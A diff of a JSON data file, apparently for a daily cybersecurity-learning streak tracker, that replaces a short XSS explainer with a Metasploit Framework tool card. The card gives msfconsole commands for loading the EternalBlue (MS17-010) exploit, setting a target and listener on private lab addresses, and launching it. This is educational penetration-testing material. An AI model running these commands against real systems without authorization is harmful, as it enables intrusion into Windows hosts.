@@ -1,15 +1,16 @@
 {
-  "current_streak": 1,
+  "current_streak": 2,
   "dates": [
-    "2026-06-26"
+    "2026-06-26",
+    "2026-06-27"
   ],
-  "last_updated": "2026-06-26T21:19:24.488763",
+  "last_updated": "2026-06-27T11:53:30.119662",
   "latest_content": {
-    "category": "vulnerabilities",
-    "content": "**What it is:** Happens when an application includes untrusted data in web pages without proper escaping, allowing attackers to inject malicious JavaScript.\n\n**Impact:** Session hijacking, credential theft, website defacement, malware distribution, and unauthorized actions on behalf of users.\n\n**Prevention:** Sanitize and escape all user input before rendering. Use Content Security Policy (CSP) headers. Implement HTTP-only and Secure flags on cookies. Use modern frameworks that automatically escape output (React, Vue, Angular).",
-    "date": "2026-06-26",
-    "title": "Cross-Site Scripting (XSS)"
+    "category": "tools",
+    "content": "**Purpose:** Most popular penetration testing framework with extensive exploit database.\n\n**Key Features:**\n- Large database of exploits and payloads\n- Modular architecture\n- Automated exploitation\n- Post-exploitation modules\n- Integration with Nmap, Nessus\n\n**Essential Commands:**\n```bash\n# Start Metasploit console\nmsfconsole\n\n# Search for exploits\nmsf6 > search type:exploit platform:windows\n\n# Use an exploit\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# Set options\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100\nmsf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50\n\n# Exploit\nmsf6 exploit(ms17_010_eternalblue) > exploit\n```\n\n**Learn More:** [metasploit.com](https://www.metasploit.com)",
+    "date": "2026-06-27",
+    "title": "Metasploit Framework"
   },
-  "longest_streak": 1,
-  "total_contributions": 1
+  "longest_streak": 2,
+  "total_contributions": 2
 }
